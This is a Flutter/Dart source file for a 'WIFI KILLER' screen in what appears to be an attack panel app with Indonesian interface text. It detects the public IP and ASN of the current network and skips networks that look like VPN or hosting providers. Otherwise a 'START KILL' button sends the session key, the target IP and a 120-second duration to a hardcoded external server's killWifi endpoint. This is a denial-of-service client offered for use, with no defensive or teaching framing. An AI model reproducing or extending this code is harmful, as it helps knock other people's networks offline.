import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:font_awesome_flutter/font_awesome_flutter.dart';

// ── COLOR SCHEME (sama persis dengan DashboardPage) ─────────────────────────
class _C {
  static const bg = Color(0xFF0c0d15);
  static const bg2 = Color(0xFF11121c);
  static const surface = Color(0xFF161823);
  static const card = Color(0xFF1a1c29);
  static const accent = Color(0xFFe8184a);
  static const accent2 = Color(0xFFff4466);
  static const accent3 = Color(0xFFff8099);
  static const gold = Color(0xFFFFD447);
  static const danger = Color(0xFFFF4D6D);
  static const text = Color(0xFFE2EAE5);
  static const muted = Color(0x73E2EAE5);
  static const muted2 = Color(0x38E2EAE5);
  static const border = Color(0x1AE8184A);
  static const border2 = Color(0x0FFFFFFF);
  static const greenG1 = Color(0xFF25D366);
  static const greenG2 = Color(0xFF18a84c);
  static const blueG1 = Color(0xFF229ED9);
  static const blueG2 = Color(0xFF0072aa);
  static const purpleG1 = Color(0xFF9C27B0);
  static const orangeG1 = Color(0xFFFF8C00);
  static const orangeG2 = Color(0xFFcc6a00);
  static const redG1 = Color(0xFFFF4D6D);
  static const redG2 = Color(0xFFcc2244);
}

// ── WIFI INTERNAL PAGE ───────────────────────────────────────────────────────
class WifiInternalPage extends StatefulWidget {
  final String sessionKey;
  const WifiInternalPage({super.key, required this.sessionKey});

  @override
  State<WifiInternalPage> createState() => _WifiInternalPageState();
}

class _WifiInternalPageState extends State<WifiInternalPage> {
  String publicIp = "-";
  String region = "-";
  String asn = "-";
  bool isVpn = false;
  bool isLoading = true;
  bool isAttacking = false;

  @override
  void initState() {
    super.initState();
    _loadPublicInfo();
  }

  // ── API Logic ──────────────────────────────────────────────────────────────
  Future<void> _loadPublicInfo() async {
    setState(() => isLoading = true);
    try {
      final ipRes = await http.get(
        Uri.parse("https://api.ipify.org?format=json"),
      );
      final ipJson = jsonDecode(ipRes.body);
      final ip = ipJson['ip'];

      final infoRes = await http.get(
        Uri.parse(
          "http://ip-api.com/json/$ip?fields=as,regionName,status,query",
        ),
      );
      final info = jsonDecode(infoRes.body);

      final asnRaw = (info['as'] as String).toLowerCase();
      final isBlockedAsn =
          asnRaw.contains("vpn") ||
          asnRaw.contains("cloud") ||
          asnRaw.contains("digitalocean") ||
          asnRaw.contains("aws") ||
          asnRaw.contains("google");

      setState(() {
        publicIp = ip;
        region = info['regionName'] ?? "-";
        asn = info['as'] ?? "-";
        isVpn = isBlockedAsn;
        isLoading = false;
      });
    } catch (e) {
      setState(() {
        publicIp = region = asn = "Error";
        isLoading = false;
      });
    }
  }

  Future<void> _attackTarget() async {
    setState(() => isAttacking = true);
    final url = Uri.parse(
      "http://104.207.64.203:2001/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120",
    );
    try {
      final res = await http.get(url);
      if (res.statusCode == 200) {
        _showAlert(
          "Attack Sent",
          "WiFi attack berhasil dikirim ke $publicIp",
          isSuccess: true,
        );
      } else {
        _showAlert("Gagal", "Server menolak permintaan.", isSuccess: false);
      }
    } catch (e) {
      _showAlert("Error", "Network error: $e", isSuccess: false);
    } finally {
      setState(() => isAttacking = false);
    }
  }

  void _showAlert(String title, String message, {bool isSuccess = false}) {
    final color = isSuccess ? _C.greenG1 : _C.danger;
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: _C.surface.withOpacity(0.98),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: color.withOpacity(0.4), width: 1),
        ),
        title: Row(
          children: [
            Container(
              width: 36,
              height: 36,
              decoration: BoxDecoration(
                color: color.withOpacity(0.12),
                borderRadius: BorderRadius.circular(10),
              ),
              child: Icon(
                isSuccess ? Icons.check_circle : Icons.warning_amber_rounded,
                color: color,
                size: 18,
              ),
            ),
            const SizedBox(width: 12),
            Text(
              title,
              style: TextStyle(
                color: _C.text,
                fontFamily: 'MADEEvolveSansEVO',
                fontSize: 14,
              ),
            ),
          ],
        ),
        content: Text(message, style: TextStyle(color: _C.muted, fontSize: 14)),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
              decoration: BoxDecoration(
                color: color,
                borderRadius: BorderRadius.circular(10),
              ),
              child: Text(
                'OK',
                style: TextStyle(
                  fontFamily: 'MADEEvolveSansEVO',
                  fontSize: 11,
                  fontWeight: FontWeight.bold,
                  color: Colors.white,
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ── BUILD ─────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _C.bg,
      appBar: AppBar(
        backgroundColor: _C.bg2,
        elevation: 0,
        centerTitle: false,
        title: Row(
          children: [
            Container(
              width: 36,
              height: 36,
              decoration: BoxDecoration(
                color: _C.redG1.withOpacity(0.12),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: _C.redG1.withOpacity(0.25)),
              ),
              child: Icon(FontAwesomeIcons.wifi, color: _C.redG1, size: 15),
            ),
            const SizedBox(width: 12),
            Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  'WIFI KILLER',
                  style: TextStyle(
                    fontFamily: 'MADEEvolveSansEVO',
                    fontSize: 13,
                    fontWeight: FontWeight.bold,
                    color: _C.text,
                  ),
                ),
                Text(
                  'External Attack Module',
                  style: TextStyle(fontSize: 10, color: _C.muted),
                ),
              ],
            ),
          ],
        ),
        actions: [
          Padding(
            padding: const EdgeInsets.only(right: 8),
            child: GestureDetector(
              onTap: _loadPublicInfo,
              child: Container(
                width: 38,
                height: 38,
                decoration: BoxDecoration(
                  color: _C.surface,
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: _C.border2),
                ),
                child: Icon(Icons.refresh, color: _C.muted, size: 16),
              ),
            ),
          ),
        ],
        iconTheme: IconThemeData(color: _C.text),
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(1),
          child: Container(height: 1, color: _C.border),
        ),
      ),
      body: isLoading
          ? Center(
              child: CircularProgressIndicator(
                strokeWidth: 2.5,
                color: _C.accent,
              ),
            )
          : SingleChildScrollView(
              physics: const BouncingScrollPhysics(),
              padding: const EdgeInsets.all(16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  // ── Info Card ──
                  Container(
                    padding: const EdgeInsets.all(14),
                    decoration: BoxDecoration(
                      color: _C.card,
                      borderRadius: BorderRadius.circular(18),
                      border: Border.all(color: _C.border),
                    ),
                    child: Row(
                      children: [
                        Container(
                          width: 48,
                          height: 48,
                          decoration: BoxDecoration(
                            color: _C.redG1.withOpacity(0.12),
                            borderRadius: BorderRadius.circular(12),
                            border: Border.all(
                              color: _C.redG1.withOpacity(0.25),
                            ),
                          ),
                          child: Icon(
                            FontAwesomeIcons.crosshairs,
                            color: _C.redG1,
                            size: 20,
                          ),
                        ),
                        const SizedBox(width: 14),
                        Expanded(
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Text(
                                'TARGET SYSTEM',
                                style: TextStyle(
                                  fontFamily: 'MADEEvolveSansEVO',
                                  fontSize: 12,
                                  fontWeight: FontWeight.bold,
                                  color: _C.text,
                                  letterSpacing: 1,
                                ),
                              ),
                              const SizedBox(height: 2),
                              Text(
                                'Informasi target akan dideteksi otomatis dari IP publik.',
                                style: TextStyle(fontSize: 12, color: _C.muted),
                              ),
                            ],
                          ),
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(height: 20),

                  // ── Section Label ──
                  Row(
                    children: [
                      Container(
                        width: 4,
                        height: 18,
                        decoration: BoxDecoration(
                          gradient: LinearGradient(
                            colors: [_C.redG1, _C.redG2],
                          ),
                          borderRadius: BorderRadius.circular(2),
                        ),
                      ),
                      const SizedBox(width: 10),
                      Text(
                        'SYSTEM INFORMATION',
                        style: TextStyle(
                          fontFamily: 'MADEEvolveSansEVO',
                          fontSize: 12,
                          fontWeight: FontWeight.bold,
                          color: _C.text,
                          letterSpacing: 1,
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 14),

                  // ── Info Cards ──
                  _infoCard(
                    'IP ADDRESS',
                    publicIp,
                    FontAwesomeIcons.globe,
                    _C.blueG1,
                  ),
                  const SizedBox(height: 10),
                  _infoCard(
                    'REGION',
                    region,
                    FontAwesomeIcons.mapLocationDot,
                    _C.orangeG1,
                  ),
                  const SizedBox(height: 10),
                  _infoCard('ASN', asn, FontAwesomeIcons.server, _C.purpleG1),
                  const SizedBox(height: 10),

                  // ── VPN Status ──
                  _vpnStatusCard(),
                  const SizedBox(height: 24),

                  // ── Attack Section ──
                  if (!isVpn) ...[
                    // Section Label
                    Row(
                      children: [
                        Container(
                          width: 4,
                          height: 18,
                          decoration: BoxDecoration(
                            gradient: LinearGradient(
                              colors: [_C.danger, _C.accent2],
                            ),
                            borderRadius: BorderRadius.circular(2),
                          ),
                        ),
                        const SizedBox(width: 10),
                        Text(
                          'ATTACK MODULE',
                          style: TextStyle(
                            fontFamily: 'MADEEvolveSansEVO',
                            fontSize: 12,
                            fontWeight: FontWeight.bold,
                            color: _C.text,
                            letterSpacing: 1,
                          ),
                        ),
                      ],
                    ),
                    const SizedBox(height: 14),

                    // Attack config card
                    Container(
                      padding: const EdgeInsets.all(16),
                      decoration: BoxDecoration(
                        color: _C.card,
                        borderRadius: BorderRadius.circular(18),
                        border: Border.all(color: _C.danger.withOpacity(0.2)),
                      ),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          // Target info
                          Row(
                            children: [
                              Container(
                                width: 32,
                                height: 32,
                                decoration: BoxDecoration(
                                  color: _C.danger.withOpacity(0.12),
                                  borderRadius: BorderRadius.circular(8),
                                ),
                                child: Icon(
                                  FontAwesomeIcons.bullseye,
                                  color: _C.danger,
                                  size: 14,
                                ),
                              ),
                              const SizedBox(width: 10),
                              Expanded(
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Text(
                                      'TARGET',
                                      style: TextStyle(
                                        fontFamily: 'ShareTechMono',
                                        fontSize: 9,
                                        color: _C.muted,
                                        letterSpacing: 1,
                                      ),
                                    ),
                                    Text(
                                      publicIp,
                                      style: TextStyle(
                                        color: _C.text,
                                        fontSize: 15,
                                        fontWeight: FontWeight.bold,
                                        fontFamily: 'ShareTechMono',
                                      ),
                                    ),
                                  ],
                                ),
                              ),
                            ],
                          ),
                          const SizedBox(height: 12),
                          Container(height: 1, color: _C.border2),
                          const SizedBox(height: 12),

                          // Duration info
                          Row(
                            children: [
                              _configChip(
                                FontAwesomeIcons.clock,
                                'DURATION',
                                '120s',
                              ),
                              const SizedBox(width: 8),
                              _configChip(
                                FontAwesomeIcons.bolt,
                                'METHOD',
                                'WiFi Kill',
                              ),
                              const SizedBox(width: 8),
                              _configChip(
                                FontAwesomeIcons.shieldHalved,
                                'STATUS',
                                'READY',
                              ),
                            ],
                          ),
                          const SizedBox(height: 18),

                          // Attack button
                          SizedBox(
                            width: double.infinity,
                            height: 54,
                            child: ElevatedButton(
                              onPressed: isAttacking ? null : _attackTarget,
                              style: ElevatedButton.styleFrom(
                                backgroundColor: _C.danger,
                                foregroundColor: Colors.white,
                                disabledBackgroundColor: _C.surface,
                                disabledForegroundColor: _C.muted2,
                                shape: RoundedRectangleBorder(
                                  borderRadius: BorderRadius.circular(14),
                                ),
                                elevation: 0,
                              ),
                              child: isAttacking
                                  ? Row(
                                      mainAxisAlignment:
                                          MainAxisAlignment.center,
                                      children: [
                                        SizedBox(
                                          width: 22,
                                          height: 22,
                                          child: CircularProgressIndicator(
                                            strokeWidth: 2.5,
                                            color: Colors.white,
                                          ),
                                        ),
                                        const SizedBox(width: 12),
                                        Text(
                                          'ATTACKING...',
                                          style: TextStyle(
                                            fontFamily: 'MADEEvolveSansEVO',
                                            fontSize: 12,
                                            fontWeight: FontWeight.bold,
                                            letterSpacing: 1,
                                          ),
                                        ),
                                      ],
                                    )
                                  : Row(
                                      mainAxisAlignment:
                                          MainAxisAlignment.center,
                                      children: [
                                        Icon(FontAwesomeIcons.wifi, size: 16),
                                        const SizedBox(width: 10),
                                        Text(
                                          'START KILL',
                                          style: TextStyle(
                                            fontFamily: 'MADEEvolveSansEVO',
                                            fontSize: 12,
                                            fontWeight: FontWeight.bold,
                                            letterSpacing: 1,
                                          ),
                                        ),
                                      ],
                                    ),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ],

                  const SizedBox(height: 30),

                  // ── Footer ──
                  _buildFooter(),
                  const SizedBox(height: 20),
                ],
              ),
            ),
    );
  }

  // ── Info Card ──────────────────────────────────────────────────────────────
  Widget _infoCard(String label, String value, IconData icon, Color iconColor) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: _C.border),
      ),
      child: Row(
        children: [
          Container(
            width: 40,
            height: 40,
            decoration: BoxDecoration(
              color: iconColor.withOpacity(0.1),
              borderRadius: BorderRadius.circular(10),
            ),
            child: Icon(icon, color: iconColor, size: 16),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  label,
                  style: TextStyle(
                    fontFamily: 'MADEEvolveSansEVO',
                    fontSize: 9,
                    color: _C.muted,
                    letterSpacing: 1,
                  ),
                ),
                const SizedBox(height: 2),
                Text(
                  value,
                  style: TextStyle(
                    color: _C.text,
                    fontSize: 14,
                    fontWeight: FontWeight.w600,
                    fontFamily: 'ShareTechMono',
                  ),
                  overflow: TextOverflow.ellipsis,
                ),
              ],
            ),
          ),
          // Copy button for IP
          if (label == 'IP ADDRESS')
            GestureDetector(
              onTap: () {
                ScaffoldMessenger.of(context).showSnackBar(
                  SnackBar(
                    content: Row(
                      children: [
                        Icon(
                          Icons.check_circle_outline,
                          color: _C.greenG1,
                          size: 20,
                        ),
                        const SizedBox(width: 10),
                        Text(
                          'IP disalin: $value',
                          style: TextStyle(color: _C.text, fontSize: 13),
                        ),
                      ],
                    ),
                    backgroundColor: _C.card,
                    behavior: SnackBarBehavior.floating,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12),
                      side: BorderSide(
                        color: _C.greenG1.withOpacity(0.4),
                        width: 1,
                      ),
                    ),
                    duration: const Duration(seconds: 2),
                  ),
                );
              },
              child: Container(
                width: 34,
                height: 34,
                decoration: BoxDecoration(
                  color: _C.surface,
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(color: _C.border2),
                ),
                child: Icon(Icons.copy, color: _C.muted, size: 14),
              ),
            ),
        ],
      ),
    );
  }

  // ── VPN Status Card ───────────────────────────────────────────────────────
  Widget _vpnStatusCard() {
    if (isVpn) {
      return Container(
        padding: const EdgeInsets.all(14),
        decoration: BoxDecoration(
          color: _C.danger.withOpacity(0.06),
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: _C.danger.withOpacity(0.3)),
        ),
        child: Row(
          children: [
            Container(
              width: 40,
              height: 40,
              decoration: BoxDecoration(
                color: _C.danger.withOpacity(0.12),
                borderRadius: BorderRadius.circular(10),
              ),
              child: Icon(
                FontAwesomeIcons.shieldHalved,
                color: _C.danger,
                size: 16,
              ),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    'BLOCKED',
                    style: TextStyle(
                      fontFamily: 'MADEEvolveSansEVO',
                      fontSize: 10,
                      fontWeight: FontWeight.bold,
                      color: _C.danger,
                      letterSpacing: 1,
                    ),
                  ),
                  const SizedBox(height: 2),
                  Text(
                    'Target terdeteksi menggunakan VPN/Hosting. Serangan dibatalkan untuk keamanan.',
                    style: TextStyle(color: _C.muted, fontSize: 12),
                  ),
                ],
              ),
            ),
          ],
        ),
      );
    }

    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: _C.greenG1.withOpacity(0.06),
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: _C.greenG1.withOpacity(0.2)),
      ),
      child: Row(
        children: [
          Container(
            width: 40,
            height: 40,
            decoration: BoxDecoration(
              color: _C.greenG1.withOpacity(0.12),
              borderRadius: BorderRadius.circular(10),
            ),
            child: Icon(
              FontAwesomeIcons.circleCheck,
              color: _C.greenG1,
              size: 16,
            ),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  'CLEARED',
                  style: TextStyle(
                    fontFamily: 'MADEEvolveSansEVO',
                    fontSize: 10,
                    fontWeight: FontWeight.bold,
                    color: _C.greenG1,
                    letterSpacing: 1,
                  ),
                ),
                const SizedBox(height: 2),
                Text(
                  'Target tidak terdeteksi VPN/Hosting. Serahkan siap dijalankan.',
                  style: TextStyle(color: _C.muted, fontSize: 12),
                ),
              ],
            ),
          ),
          Container(
            width: 8,
            height: 8,
            decoration: BoxDecoration(
              color: _C.greenG1,
              shape: BoxShape.circle,
              boxShadow: [
                BoxShadow(color: _C.greenG1, blurRadius: 6, spreadRadius: 1),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ── Config Chip ────────────────────────────────────────────────────────────
  Widget _configChip(IconData icon, String label, String value) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
        decoration: BoxDecoration(
          color: _C.surface,
          borderRadius: BorderRadius.circular(10),
        ),
        child: Row(
          children: [
            Icon(icon, color: _C.muted2, size: 12),
            const SizedBox(width: 6),
            Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  label,
                  style: TextStyle(
                    fontSize: 8,
                    color: _C.muted2,
                    fontFamily: 'MADEEvolveSansEVO',
                    letterSpacing: 0.5,
                  ),
                ),
                Text(
                  value,
                  style: TextStyle(
                    fontSize: 11,
                    color: _C.text,
                    fontWeight: FontWeight.w600,
                    fontFamily: 'ShareTechMono',
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  // ── Footer ────────────────────────────────────────────────────────────────
  Widget _buildFooter() {
    return Column(
      children: [
        Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Container(
              width: 6,
              height: 6,
              decoration: BoxDecoration(
                color: _C.greenG1,
                shape: BoxShape.circle,
                boxShadow: [BoxShadow(color: _C.greenG1, blurRadius: 4)],
              ),
            ),
            const SizedBox(width: 8),
            Text(
              'SECURE CONNECTION',
              style: TextStyle(
                fontFamily: 'MADEEvolveSansEVO',
                fontSize: 9,
                color: _C.muted2,
                letterSpacing: 1,
              ),
            ),
            const SizedBox(width: 12),
            Icon(Icons.fingerprint, color: _C.muted2, size: 12),
          ],
        ),
        const SizedBox(height: 4),
        Text(
          'SYAHID • ENCRYPTED',
          style: TextStyle(
            fontFamily: 'ShareTechMono',
            fontSize: 9,
            color: _C.muted2,
            letterSpacing: 1.5,
          ),
        ),
      ],
    );
  }
}
